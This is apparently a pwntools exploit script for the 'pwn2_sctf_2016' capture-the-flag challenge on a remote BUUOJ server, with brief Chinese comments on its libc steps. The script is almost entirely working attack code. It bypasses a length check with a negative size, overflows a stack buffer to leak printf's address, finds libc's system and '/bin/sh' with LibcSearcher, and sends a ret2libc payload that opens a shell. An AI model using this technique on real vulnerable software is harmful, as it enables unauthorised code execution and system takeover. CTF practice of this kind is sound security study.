from pwn import *

context(log_level='debug')

#io=process("./pwn2_sctf_2016")
io=remote("node3.buuoj.cn",28162)
elf=ELF("./pwn2_sctf_2016")

printf_plt=elf.plt['printf']
printf_got=elf.got['printf']
main=0x80485B8

io.recv()

io.sendline(str(-24))

io.recv()

payload=b'A'*(0x2c+0x4)+p32(printf_plt)+p32(main)+p32(printf_got)

io.sendline(payload)

io.recvuntil(b'\x0a')

printf_addr=u32(io.recv(4))

print(hex(printf_addr))

io.recv()


from LibcSearcher import *  

libc = LibcSearcher('printf',printf_addr)  
#获取libc加载地址  
libc_base = printf_addr - libc.dump('printf')  
#获取system地址  
system_addr = libc_base + libc.dump('system')  
#获取/bin/sh地址  
binsh_addr = libc_base + libc.dump('str_bin_sh') 

io.sendline(str(-24))

io.recv()

payload=b'A'*(0x2c+0x4)+p32(system_addr)+p32(main)+p32(binsh_addr)

io.sendline(payload)

#select 5


io.interactive()